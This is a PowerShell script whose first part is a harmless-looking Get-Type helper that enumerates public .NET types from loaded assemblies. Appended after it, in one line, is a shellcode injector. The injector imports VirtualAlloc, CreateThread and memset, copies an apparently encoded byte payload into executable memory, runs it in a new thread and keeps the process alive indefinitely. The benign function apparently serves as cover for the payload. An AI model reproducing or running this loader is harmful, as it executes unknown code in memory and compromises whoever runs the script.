﻿function Get-Type {
    
    [cmdletbinding()]
    param(
        [string]$Module = '*',
        [string]$Assembly = '*',
        [string]$FullName = '*',
        [string]$Namespace = '*',
        [string]$BaseType = '*',
        [switch]$IsEnum
    )
    
    
        $WhereArray = @('$_.IsPublic')
        if($Module -ne "*"){$WhereArray += '$_.Module -like $Module'}
        if($Assembly -ne "*"){$WhereArray += '$_.Assembly -like $Assembly'}
        if($FullName -ne "*"){$WhereArray += '$_.FullName -like $FullName'}
        if($Namespace -ne "*"){$WhereArray += '$_.Namespace -like $Namespace'}
        if($BaseType -ne "*"){$WhereArray += '$_.BaseType -like $BaseType'}
        
        if($PSBoundParameters.ContainsKey("IsEnum")) { $WhereArray += '$_.IsENum -like $IsENum' }
    
    
        $WhereString = $WhereArray -Join " -and "
        $WhereBlock = [scriptblock]::Create( $WhereString )
        Write-Verbose "Where ScriptBlock: { $WhereString }"

    
        [AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object {
            Write-Verbose "Getting types from $($_.FullName)"
            Try
            {
                $_.GetExportedTypes()
            }
            Catch
            {
                Write-Verbose "$($_.FullName) error getting Exported Types: $_"
                $null
            }

        } | Where-Object -FilterScript $WhereBlock
}


$l3f3 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $l3f3 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdd,0xc0,0xbd,0xdd,0x48,0x0a,0x91,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x71,0x31,0x6a,0x17,0x83,0xea,0xfc,0x03,0xb7,0x5b,0xe8,0x64,0xbb,0xb4,0x65,0x86,0x43,0x45,0x16,0x0e,0xa6,0x74,0x04,0x74,0xa3,0x25,0x98,0xfe,0xe1,0xc5,0x53,0x52,0x11,0x5d,0x11,0x7b,0x16,0xd6,0x9c,0x5d,0x19,0xe7,0x10,0x62,0xf5,0x2b,0x32,0x1e,0x07,0x78,0x94,0x1f,0xc8,0x8d,0xd5,0x58,0x34,0x7d,0x87,0x31,0x33,0x2c,0x38,0x35,0x01,0xed,0x39,0x99,0x0e,0x4d,0x42,0x9c,0xd0,0x3a,0xf8,0x9f,0x00,0x92,0x77,0xd7,0xb8,0x98,0xd0,0xc8,0xb9,0x4d,0x03,0x34,0xf0,0xfa,0xf0,0xce,0x03,0x2b,0xc9,0x2f,0x32,0x13,0x86,0x11,0xfb,0x9e,0xd6,0x56,0x3b,0x41,0xad,0xac,0x38,0xfc,0xb6,0x76,0x43,0xda,0x33,0x6b,0xe3,0xa9,0xe4,0x4f,0x12,0x7d,0x72,0x1b,0x18,0xca,0xf0,0x43,0x3c,0xcd,0xd5,0xff,0x38,0x46,0xd8,0x2f,0xc9,0x1c,0xff,0xeb,0x92,0xc7,0x9e,0xaa,0x7e,0xa9,0x9f,0xad,0x26,0x16,0x3a,0xa5,0xc4,0x43,0x3c,0xe4,0x80,0xfd,0x24,0x63,0x50,0x6a,0xd0,0xe2,0x3e,0x03,0x97,0x13,0xea,0xbb,0xeb,0xac,0x34,0x3b,0x0b,0x87,0x09,0xbc,0xa4,0x7f,0x3e,0x15,0x1d,0xe8,0xfa,0xcf,0xd8,0x4f,0x05,0x3a,0xf1,0xf0,0xa2,0xf4,0xcf,0xa0,0x05,0x9d,0xcc,0x13,0xf4,0x0b,0x83,0xc0,0xa6,0xa3,0x74,0x6e,0xd9,0xf2,0x84,0xa5,0x0e,0xb5,0x23,0x77,0x02,0x18,0xbc,0x77,0x90,0xfd,0xb8,0x2a,0x86,0xaf,0x91,0x98,0x76,0x38,0xf9,0x48,0x58,0x83,0x02,0xa7,0x2d,0x35,0x96,0x58,0x76,0xd2,0xe7,0x6a,0x88,0x22,0x61,0x6c,0xe2,0x26,0x21,0x07,0xed,0x70,0xa9,0xa2,0x57,0xe3,0xaf,0xb2,0x82,0x2a,0x4f,0x1b,0x7b,0x1a,0xf8,0xf2,0xeb,0x89,0x00,0xe3,0x90,0x2e,0xd9,0x96,0xa6,0xa4,0xcc,0xd3,0x29,0xc3,0x9a,0xe4,0x35,0xcb,0x77,0x35,0xdc,0x53,0x87,0xb6,0x1e,0x8c,0x24,0x49,0xe1,0xb3,0x1a,0xdb,0x72,0x28,0x10,0x4f,0xe9,0xc3,0xf5,0xfc,0x87,0x4a,0x79,0x2c,0x09,0xf9,0x16,0x57,0xa7,0x6f,0x8c,0xfb,0x69,0x15,0x36,0x61,0x75,0x3e,0xad,0x58,0xb5,0x9f,0x62,0xf1,0x37,0x4a,0x81,0x55,0x5d,0x88,0xef,0x57,0xf6,0xe4,0x35,0xa1,0x22,0xbb,0x36,0x9b,0x41,0x75,0x09,0x42,0xdd,0x72,0x8a,0xa2,0xd9,0x2f,0x01,0xf8,0xc5,0xc7,0x28,0xc1,0xb1,0xdb,0x1a,0x90,0xef,0xb3,0x88,0x84,0x86,0xa6,0x52,0x7d,0x1d,0xe6,0xd9,0x53,0x45,0x62,0xe1,0xd8,0x63,0x06,0xe2,0x74,0xdb,0x5b,0xa6,0x50,0xd7,0x33,0x74,0xf1,0xca,0xe4,0xd4,0x5a,0xeb,0xde,0xaa,0xb1,0x17,0x0a,0x62,0x1a,0x7f,0x0a,0xed,0x1a,0x2d,0x6d,0xc7,0x4f,0xd1,0xc6,0x80,0xbe,0x5a,0x87,0xd7,0x3e,0x89,0x32,0xd8,0xa8,0xc1,0x76,0x7a,0x7e,0xde,0xac,0x93,0xef,0xdf,0xb0,0x9b,0x6e,0x31,0x3f,0x0a,0xe8,0x4d,0x57,0x2c,0x08,0xb2,0x58,0xba,0x87,0x29,0xca,0x54,0x03,0x9f,0x67,0xcc,0xd3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$YoZ7=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($YoZ7.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$YoZ7,0,0,0);for (;;){Start-sleep 60};

